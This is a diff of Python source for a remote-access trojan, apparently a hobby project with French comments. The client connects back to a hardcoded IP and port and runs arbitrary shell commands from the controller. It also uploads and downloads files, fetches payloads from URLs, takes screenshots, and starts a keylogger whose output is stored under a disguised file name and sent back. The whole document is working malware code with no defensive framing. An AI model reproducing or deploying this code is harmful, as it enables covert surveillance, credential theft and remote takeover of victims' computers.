@@ -9,27 +9,33 @@ import base64
 import shutil
 import sys
 import time
-#import requests #va savoir pk mais requests marche pas en le compilant sur windows, remplace par urllib
+import requests #va savoir pk mais requests marche pas en le compilant sur windows, remplace par urllib
 import urllib
-#from mss import mss #marche pas sur windows
+from mss import mss #marche pas sur windows
 import threading
-#import keylogger #le nom de notre keylogger dans le mm repertoire, marche sur windows mais pas depuis linux
+import keylogger #le nom de notre keylogger dans le mm repertoire, marche sur windows mais pas depuis linux
 
-iptoconnect = "10.32.0.117" #si on fait une attaque a travers internet avec port forward, il faut l'ip publique du routeur, et le port forward du routeur
+iptoconnect = "192.168.0.100" #si on fait une attaque a travers internet avec port forward, il faut l'ip publique du routeur, et le port forward du routeur
 porttoconnect = 51234
 
 
 def reliable_send(data): #pour envoyer plus de 1024 bits
-	json_data = json.dumps(data, ensure_ascii=False)
-	sock.send(json_data)
-	print("reliable send")
+	print("before json_data")
+	# obligé de faire le try except à cause des prb d'encodage windows/linux qui ne sont pas les mêmes
+	try:
+		json_data = json.dumps(data.decode())
+		sock.send(json_data.encode('cp850','replace'))
+		print("after reliable send")
+	except:
+		json_data = json.dumps(data)
+		sock.send(json_data.encode('cp850','replace'))
+		print("after reliable send")
 
 def reliable_recv():
 	data = "" #empty
 	while True:
 		try:
-			data = data + sock.recv(1024).decode('utf-8','ignore')
-			print(data)
+			data = data + sock.recv(1024).decode('utf-8','replace')
 			return json.loads(data) #une fois que c bon y a tout dans data
 		except ValueError:
 			continue #si on recoit plus de 1024 on continue
@@ -48,11 +54,13 @@ def screenshot():
 		screenshot.shot()
 
 def download(url):
-	#get_response = requests.get(url)
-	#file_name = url.split("/")[-1] #nom = derniere partie de l'url
-	get_response = urllib.urlretrieve(url, url.split("/")[-1])
-	#with open(file_name, "wb") as out_file:
-	#	out_file.write(get_response.encode('utf-8')) #write le contenu du fichier telecharge
+	get_response = requests.get(url)
+	file_name = url.split("/")[-1] #nom = derniere partie de l'url
+	# print("before get response")
+	# get_response = urllib.urlretrieve(url, url.split("/")[-1])
+	# print("after get response")
+	with open(file_name, "wb") as out_file:
+		out_file.write(get_response.encode('utf-8')) #write le contenu du fichier telecharge
 
 def connection():
 	if quit == False:
@@ -91,18 +99,11 @@ def shell():
 				reliable_send(base64.b64encode(file.read()))
 		elif command[:6] == "upload":
 			with open(command[7:], "wb") as fin: #write bytes
-				print("upload fonction")
 				file_data = reliable_recv()
-				print("code")
-				print(file_data)
-				print("decode")
-				print(base64.b64decode(file_data))
-				print("dedecode")
-				recv= base64.b64decode(base64.b64decode(file_data))
-				print(recv)
-				fin.write(recv)
+				fin.write(base64.b64decode(file_data))
 		elif command[:3] == "get":
 			try:
+				print("download function")
 				download(command[4:])
 				reliable_send("[+] Downloaded file from specified URL !")
 			except:
@@ -113,7 +114,6 @@ def shell():
 				print("screenshot shot")
 				with open("monitor-1.png","rb") as sc: #tjrs ce nom la
 					reliable_send(base64.b64encode(sc.read()))
-					print("image envoyee")
 				os.remove("monitor-1.png") #on supprime le screenshot direct apres l'avoir envoye
 			except:
 				reliable_send("[!!] Failed to take Screenshot")
@@ -133,23 +133,20 @@ def shell():
 			t1 = threading.Thread(target=keylogger.start) #on va run la fontion start de notre keylogger dans un threak
 			t1.start() #on start le thread
 		elif command[:11] == "keylog_dump": #on recupere les donnes receillies par le keylogger
-			fn = open(keylogger_path, "r")
+			fn = open(keylogger.path, "r")
 			reliable_send(fn.read())
 		else:
 			print("command :")
-			#print(type(command))
 			print(command)
 			try:
 				proc = subprocess.Popen(command.encode('utf-8','ignore'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-				print("subprocess")
 				result = proc.stdout.read() + proc.stderr.read()
-				print("result")
 				print(result)
 				reliable_send(result)
 			except:
 				continue
 
-keylogger_path = os.environ["appdata"] + "\\processmanager.txt" #nom du fichier qui sera ds appdata, le mm que ds keylogger.py
+# keylogger_path = os.environ["appdata"] + "\\processmanager.txt" #nom du fichier qui sera ds appdata, le mm que ds keylogger.py
 
 #location = os.environ["appdata"] + "\\windows32.exe" #ca va trouver le path appdata sur la target pc
 #if not os.path.exists(location): #on veut creer un fichier seulement s'il existe pas
@@ -172,8 +169,6 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 global quit
 quit = False
 
-#sock.connect((iptoconnect,porttoconnect))
-#shell()
 connection()
 
 sock.close()
